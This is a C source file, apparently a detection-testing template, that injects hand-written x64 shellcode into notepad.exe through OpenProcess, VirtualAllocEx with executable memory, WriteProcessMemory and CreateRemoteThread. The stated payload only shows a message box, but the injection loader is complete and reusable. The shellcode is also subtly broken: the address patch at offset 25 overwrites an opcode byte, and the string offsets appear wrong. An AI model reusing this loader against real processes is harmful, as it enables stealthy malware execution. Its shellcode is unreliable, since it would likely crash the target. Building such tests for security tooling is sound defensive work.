/**
 * Process Injection Template
 *
 * Suspicious Pattern: Classic remote thread injection into notepad.exe
 * EDR Trigger: OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
 * Benign Effect: Injects code that creates a message box, doesn't harm notepad
 *
 * Detection likelihood: VERY HIGH (textbook malware technique)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Shellcode: Display MessageBox then return
// Position-independent code that doesn't rely on external addresses
unsigned char shellcode[] = {
    // MessageBoxA shellcode (x64)
    // sub rsp, 0x28              ; Shadow space + alignment
    0x48, 0x83, 0xEC, 0x28,

    // xor rcx, rcx               ; hWnd = NULL
    0x48, 0x31, 0xC9,

    // lea rdx, [rip + message]   ; lpText
    0x48, 0x8D, 0x15, 0x1C, 0x00, 0x00, 0x00,

    // lea r8, [rip + title]      ; lpCaption
    0x4C, 0x8D, 0x05, 0x1D, 0x00, 0x00, 0x00,

    // xor r9d, r9d               ; uType = MB_OK
    0x45, 0x31, 0xC9,

    // mov rax, 0x1234567812345678  ; MessageBoxA address (patched at runtime)
    0x48, 0xB8, 0x78, 0x56, 0x34, 0x12, 0x78, 0x56, 0x34, 0x12,

    // call rax
    0xFF, 0xD0,

    // add rsp, 0x28
    0x48, 0x83, 0xC4, 0x28,

    // ret
    0xC3,

    // Message string
    'I', 'n', 'j', 'e', 'c', 't', 'e', 'd', ' ', 'C', 'o', 'd', 'e', '!', 0x00,

    // Title string
    'B', 'e', 'n', 'i', 'g', 'n', ' ', 'T', 'e', 's', 't', 0x00
};

// Find process ID by name
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

int main(void) {
    printf("[PROCESS_INJECTION] Classic injection pattern test\n");
    printf("[PROCESS_INJECTION] PID: %lu\n", GetCurrentProcessId());
    printf("\n");
    printf("[WARNING] This uses the EXACT pattern malware uses!\n");
    printf("[INFO] But payload is benign (just shows a MessageBox)\n");
    printf("\n");

    // Find or create notepad.exe
    printf("[STEP 1] Looking for notepad.exe...\n");
    DWORD targetPid = FindProcessId("notepad.exe");

    if (targetPid == 0) {
        printf("[INFO] Notepad not found, launching it...\n");
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi = {0};

        if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
        )) {
            fprintf(stderr, "[ERROR] Failed to launch notepad: %lu\n", GetLastError());
            return 1;
        }

        targetPid = pi.dwProcessId;
        printf("[INFO] Launched notepad.exe (PID: %lu)\n", targetPid);
        Sleep(1000);  // Wait for notepad to initialize

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[INFO] Found running notepad.exe (PID: %lu)\n", targetPid);
    }

    // === SUSPICIOUS PATTERN STARTS HERE ===

    printf("\n[SUSPICIOUS] Opening target process...\n");
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        FALSE,
        targetPid
    );

    if (!hProcess) {
        fprintf(stderr, "[ERROR] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[SUSPICIOUS] Process opened successfully\n");

    // Get MessageBoxA address in target process
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");

    // Patch shellcode with MessageBoxA address
    *(UINT64*)(shellcode + 25) = (UINT64)pMessageBoxA;

    printf("[SUSPICIOUS] Allocating memory in target process...\n");
    LPVOID remoteMem = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteMem) {
        fprintf(stderr, "[ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    printf("[SUSPICIOUS] Allocated at: %p (in target process)\n", remoteMem);

    printf("[SUSPICIOUS] Writing shellcode to target process...\n");
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode, sizeof(shellcode), &bytesWritten)) {
        fprintf(stderr, "[ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[SUSPICIOUS] Wrote %zu bytes to target\n", bytesWritten);

    printf("[SUSPICIOUS] Creating remote thread in target process...\n");
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        fprintf(stderr, "[ERROR] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[SUSPICIOUS] Remote thread created!\n");
    printf("\n[INFO] Check notepad.exe - it should show a MessageBox\n");
    printf("[INFO] This is the EXACT technique malware uses for code injection\n");
    printf("\n");

    // Wait for remote thread
    WaitForSingleObject(hThread, INFINITE);

    printf("[INFO] Remote thread completed\n");
    printf("[INFO] Cleaning up...\n");

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[PROCESS_INJECTION] Test complete - press Enter to exit\n");
    getchar();

    return 0;
}
